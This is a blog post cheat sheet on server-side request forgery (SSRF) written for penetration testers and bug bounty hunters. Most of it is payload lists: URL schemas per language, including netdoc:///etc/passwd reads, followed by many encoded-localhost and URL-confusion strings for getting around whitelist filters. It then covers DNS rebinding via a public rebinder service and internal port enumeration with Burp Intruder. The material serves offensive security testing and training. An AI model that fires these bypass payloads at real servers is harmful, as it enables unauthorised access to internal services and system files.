---
layout: blog_item
title: "SSRF Cheat Sheet & Bypass Techniques"
date:   2021-05-30 09:29:10
author: Arr0way
description: 'SSRF explained and the techniques to indentify, and bypass server side SSRF filtering.'
categories: [cheat-sheet]
tags:
- SSRF
- 'Web Application Penetration Testing'
---

* list element with functor item
{:toc}

## What is SSRF? 

Server Side Request Forgery (SSRF) is a web vulnerability that allows an attacker to exploit vulnerable functionality to access server side or local network services / functionality by affectively traversing the external firewall using vulnerable web functionality. 

Another way to think of this would be to imagine the web applications vulnerable function is a web browser, that will allow you to pivot / relay request to the internal interface addresses, loopback or internal network to access services (effectively traversing the WAF or firewall). 

An example of this could be a web function that allows the adding of a URL or third-party service, this could then be exploited to access internal or local IP address. 

After identifying SSRF on applications running modern frameworks or a WAF, more work will be required in an effort to defeat the protection / filtering that is in place, and allow for successful SSRF exploitation. 

<!--more-->


## Identifying Potential Locations for SSRF

Any functionality that allows external service interaction is a good stating point, any where that accepts a third party URL or service integration.

## How to Find SSRF Vulnerabilities 

In order to identify a SSRF vulnerability the first step is confirming that the functionality is vulnerable, an easy / scalable way to do this <a href="https://www.linode.com/?r=de68d06f20e245c4952795b3a57180b223ff4d42" rel="nofollow">is using your own Burp Collaborator on Linode</a>. Burp Collaborator will easily allow you to assess if out-of-band interaction is possible (the target server directly accessing a server you control). 

<div class="note tip">
  <h5>PRO TIP: Run Your Own Collaborator Server</h5>
  <p>If you are taking part in bug bounty programs run your own Burp Collaborator  server as often the default Burp Collaborator service domain is filtered, giving you an increased chance of detection.</p>
    
    <p><a href="https://www.linode.com/?r=de68d06f20e245c4952795b3a57180b223ff4d42" rel="nofollow">Linode works great for this</a>, it's cheap, fixed price and has a direct public IP address.</p>
</div>

It should be noted that a function may still, potentially be vulnerable even if not identifid via Burp Collaborator, this is typically due to the target server not allowing outbound dns or strict egress firewall rules.  

## SSRF Whitelist Filter Bypass 

### Timing Difference

At the detection phase, try timing difference on responses to see if there is filtering in place when different domains, IP's or ports are being fitlered. 

### URL Schema / Wrappers

The following URL schemas can be potentially exploited by SSRF vulnerabilies. 

The URL schemas have been sorted by framework / language. 



#### PHP SSRF Wrappers / URL Schema 

The following wrappers are potentiall expected URL schema wrappers found within PHP environments (for some schema curl-wrappers would need to be enabled). 

{% highlight bash %}
gopher://
fd://
expect://
ogg://
tftp://
dict://
ftp://
ssh2://
file://
http://
https://
imap://
pop3://
mailto://
smtp://
telnet://
{% endhighlight %}

#### ASP.NET SSRF Wrappers / URL Schema 

The following wrappers are potentiall expected URL schema wrappers found within ASP.NET environments (gopher legacy only). 

{% highlight bash %}
gopher://
ftp://
file://
http://
https://
{% endhighlight %}

#### Java SSRF Wrappers / URL Schema 

The following wrappers are expected within Java environments, and can be used to potentially exploit [LFI](https://highon.coffee/blog/lfi-cheat-sheet/) vulnerabilities. 

{% highlight bash %} 
ftp://
file://
http://
https://
gopher://
netdoc:///etc/passwd
netdoc:///etc/hosts
jar:proto-schema://blah!/
jar:http://localhost!/
jar:http://127.0.0.1!/
jar:http://0.0.0.0!/
jar:ftp://local-domain.com!/
{% endhighlight %}

<div class="note tip">
  <h5>NOTE: OpenJDK 8+ Redirects</h5>
  <p>It should be noted that OpenJDK 8+ does not follow redirects if the protocols do not match. </p>
</div>



#### cURL SSRF Wrappers / URL Schema 

The following wrappers are expected with environments using cURL. 

{% highlight bash %}
file:///
dict://
sftp://
ldap://
tftp://
gopher://
ssh://
http://
https://
imap://
pop3://
smtp://
telnet://
{% endhighlight %}


### Open Redirect SSRF Bypass 

Open redirects can potentially be used to bypass server side whitelist filtering, by appearing to be from the target domain (which has an increased chance of being whitelisted).

Example: 

{% highlight bash %}
/foo/bar?vuln-function=http://127.0.0.1:8888/secret
{% endhighlight %}

### Basic locahost bypass attempts 

Localhost bypass:

{% highlight bash %}
All IPv4: 0
All IPv6: ::
All IPv4: 0.0.0.0
Localhost IPv6: ::1
All IPv4: 0000
All IPv4: (Leading zeros): 00000000
IPv4 mapped IPv6 address: 0:0:0:0:0:FFFF:7F00:0001
8-Bit Octal conversion: 0177.00.00.01
32-Bit Octal conversion: 017700000001
32-Bit Hex conversion: 0x7f000001
{% endhighlight %}

various bypasses: 

{% highlight bash %}
127.0.0.1:80
127.0.0.1:443
127.0.0.1:22
127.1:80
0
0.0.0.0:80
localhost:80
[::]:80/
[::]:25/ SMTP
[::]:3128/ Squid
[0000::1]:80/
[0:0:0:0:0:ffff:127.0.0.1]/thefile
①②⑦.⓪.⓪.⓪
127.127.127.127
127.0.1.3
127.0.0.0
2130706433/
017700000001
3232235521/
3232235777/
0x7f000001/
0xc0a80014/
{domain}@127.0.0.1
127.0.0.1#{domain}
{domain}.127.0.0.1
127.0.0.1/{domain}
127.0.0.1/?d={domain}
{domain}@127.0.0.1
127.0.0.1#{domain}
{domain}.127.0.0.1
127.0.0.1/{domain}
127.0.0.1/?d={domain}
{domain}@localhost
localhost#{domain}
{domain}.localhost
localhost/{domain}
localhost/?d={domain}
127.0.0.1%00{domain}
127.0.0.1?{domain}
127.0.0.1///{domain}
127.0.0.1%00{domain}
127.0.0.1?{domain}
127.0.0.1///{domain}st:+11211aaa
st:00011211aaaa
0/
127.1
127.0.1
1.1.1.1 &@2.2.2.2# @3.3.3.3/
127.1.1.1:80\@127.2.2.2:80/
127.1.1.1:80\@@127.2.2.2:80/
127.1.1.1:80:\@@127.2.2.2:80/
127.1.1.1:80#\@127.2.2.2:80/
{% endhighlight %}


### hosts file bypass attempts 

### Enclosed Alphanumeric 

{% highlight bash %}
http://⑯⑨。②⑤④。⑯⑨｡②⑤④/
http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/
{% endhighlight %}

## DNS rebinding attempts 

### What is a DNS rebinding attack?

In certain situations a target function may check a hostname "blindly" against a whitelist/blacklist without verification of the the resolution IP address. Once the hostname has been determined OK by the above function it is then passed to the function which it is intended to protect.

### How to exploit a vulnerable function

You can setup a DNS server that resolves to the whitelist, then have a short TTL which changes to the IP you want to exploit e.g. 127.0.0.1 for SSRF, or any other internal IP. 

Fortunately taviso has built a [service for this](https://github.com/taviso/rbndr) which you can use to generate a dword subdomain and use against your target. The downside to this service is that it appears to flip the resolution IP back and forth, so it may change during the attack. 

You can use the follow web app to generate your rebinder domain: https://lock.cmpxchg8b.com/rebinder.html

To overcome this issue, have one of the resolution IP addresses in your control and verify the response of that IP request, to help determine if the target functionality is vulnerable.

1. go to https://lock.cmpxchg8b.com/rebinder.html add your IP's
2. check it works with host 
3. attempt to exploit the SSRF location with it


## Post Exploitation / Enumeration

In an effort to demonstrate the severity of the SSRF vulnerability enumeration of server side ports could be performed using Burp Intruder. 

The above process could be performed to enumerate other local IP addresses and/or bruteforcing URL (IDOR / Forced Browsing) to identify services or functionality that was not intended by the organisation. 


Happy hunting / pen testing. 
